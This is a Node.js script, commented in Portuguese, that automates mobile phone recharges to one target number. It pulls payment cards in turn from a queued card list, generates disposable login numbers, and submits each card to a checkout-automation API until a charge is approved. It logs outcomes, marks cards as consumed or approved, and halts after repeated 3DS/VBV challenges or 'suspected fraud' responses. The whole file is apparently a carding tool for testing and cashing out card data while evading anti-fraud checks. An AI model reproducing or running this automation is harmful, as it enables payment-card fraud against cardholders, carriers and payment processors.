#!/usr/bin/env node
/**
 * Recarga cruzada até aprovar, 3x VBV seguidos ou 2x fraude suspeita seguidas.
 * Uso: node scripts/run-cross-recharge-until.mjs <destino> <valor_reais> [max_tentativas]
 */
import '../lib/load-env.mjs';
import { generateLoginMsisdn } from '../lib/generate-msisdn.mjs';
import { cardToPam } from '../lib/card-to-pam.mjs';
import { parseCardInput } from '../lib/card-parse.mjs';
import { mapAutomationPaymentStatus, waitForAutomationIdle } from '../lib/automation-client.mjs';
import { createCardListStore } from '../lib/card-list.mjs';
import { getDataDir } from '../lib/data-dir.mjs';
import { classifyCardListAction } from '../lib/card-outcome.mjs';

const target = String(process.argv[2] ?? '').replace(/\D/g, '');
const valueReais = String(process.argv[3] ?? '35').replace(/\D/g, '');
const maxAttempts = Math.min(50, Math.max(1, Number(process.argv[4] ?? 50) || 50));
const API = process.env.AUTOMATION_API_URL || 'http://127.0.0.1:3000';
const cardList = createCardListStore(getDataDir());
const SCRIPT_CHAT = 'cross-until-script';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

if (!target || target.length !== 11) {
  console.error('Uso: node scripts/run-cross-recharge-until.mjs <destino> <valor> [max]');
  process.exit(1);
}

async function pickCardLine() {
  const reserved = await cardList.reserveNextCard(SCRIPT_CHAT);
  if (!reserved?.line) throw new Error('Sem cartão na fila pending');
  return reserved.line;
}

async function applyCardOutcome(line, outcome, error) {
  const action = classifyCardListAction({ outcome, error });
  if (action === 'return') {
    await cardList.applyOutcome(line, 'return', '', SCRIPT_CHAT);
  } else if (action === 'approved') {
    await cardList.applyOutcome(line, 'approved', '', SCRIPT_CHAT);
  } else {
    await cardList.applyOutcome(line, 'consumed', outcome?.result?.gateCode || outcome?.result?.message || '', SCRIPT_CHAT);
  }
  return action;
}

function isFraud(msg) {
  return /suspected fraud|fraude|suspeit/i.test(String(msg ?? ''));
}

function isVbv(mapped, pr) {
  return mapped === '3DS_REQUIRED' || pr?.visualVbv === true || pr?.status === '3ds_required';
}

console.log(`=== until-stop destino=${target} R$${valueReais} max=${maxAttempts} ===\n`);

let vbvStreak = 0;
let fraudStreak = 0;

for (let i = 1; i <= maxAttempts; i++) {
  await waitForAutomationIdle({ timeoutMs: 180000, pollMs: 500 });

  const cardLine = await pickCardLine();
  const card = parseCardInput(cardLine);
  const pamInfo = cardToPam(card);
  const pan = pamInfo.split('|')[0];

  let login;
  try {
    login = await generateLoginMsisdn({ maxAttempts: 8 });
  } catch (err) {
    console.log(`[${i}] falha login: ${err.message}`);
    await cardList.applyOutcome(cardLine, 'return', '', SCRIPT_CHAT);
    await sleep(2000);
    continue;
  }

  console.log(`[${i}] login=${login.msisdn} → ${target} ****${pan.slice(-4)}`);

  const started = Date.now();
  let data;
  try {
    const res = await fetch(`${API.replace(/\/$/, '')}/api/session/start-checkout-link`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', accept: 'application/json' },
      body: JSON.stringify({
        loginUrl: login.link,
        accessNumber: login.msisdn,
        rechargeTargetNumber: target,
        rechargeValue: valueReais,
        pamInfo,
        browser: 'edge',
      }),
    });
    data = await res.json().catch(() => ({}));
    if (!res.ok) {
      console.log(`[${i}] HTTP ${res.status}: ${data.error || JSON.stringify(data).slice(0, 120)}`);
      await cardList.applyOutcome(cardLine, 'return', '', SCRIPT_CHAT);
      vbvStreak = 0;
      fraudStreak = 0;
      await sleep(1500);
      continue;
    }
  } catch (err) {
    console.log(`[${i}] rede: ${err.message}`);
    await cardList.applyOutcome(cardLine, 'return', '', SCRIPT_CHAT);
    fraudStreak = 0;
    await sleep(1500);
    continue;
  }

  const pr = data.paymentResult ?? {};
  const mapped = mapAutomationPaymentStatus(pr, data);
  const msg = String(pr.gateMessage || pr.message || data.lastError || '');

  console.log(
    JSON.stringify({
      attempt: i,
      login: login.msisdn,
      cardMask: `****${pan.slice(-4)}`,
      mapped,
      gateCode: pr.gateCode ?? null,
      gateMessage: msg.slice(0, 160),
      visualVbv: pr.visualVbv ?? false,
      totalMs: data.timings?.totalMs ?? Date.now() - started,
      cardAction: await applyCardOutcome(cardLine, { result: { status: mapped, gateCode: pr.gateCode, message: msg, negativeReason: msg }, automation: { raw: pr } }, null),
    }),
  );

  if (mapped === 'CONFIRMED') {
    console.log(`\n✅ APROVADO tentativa ${i}`);
    process.exit(0);
  }

  if (isVbv(mapped, pr)) {
    vbvStreak += 1;
    fraudStreak = 0;
    console.log(`   VBV streak ${vbvStreak}/3`);
    if (vbvStreak >= 3) {
      console.log('\n⏸ Parou: 3x VBV/3DS seguidos');
      process.exit(3);
    }
  } else if (isFraud(msg)) {
    fraudStreak += 1;
    vbvStreak = 0;
    console.log(`   Fraude streak ${fraudStreak}/2`);
    if (fraudStreak >= 2) {
      console.log('\n⏸ Parou: 2x suspeita de fraude seguidas');
      process.exit(4);
    }
  } else {
    vbvStreak = 0;
    fraudStreak = 0;
  }

  await sleep(800);
}

console.log(`\n❌ ${maxAttempts} tentativas sem aprovação`);
process.exit(1);
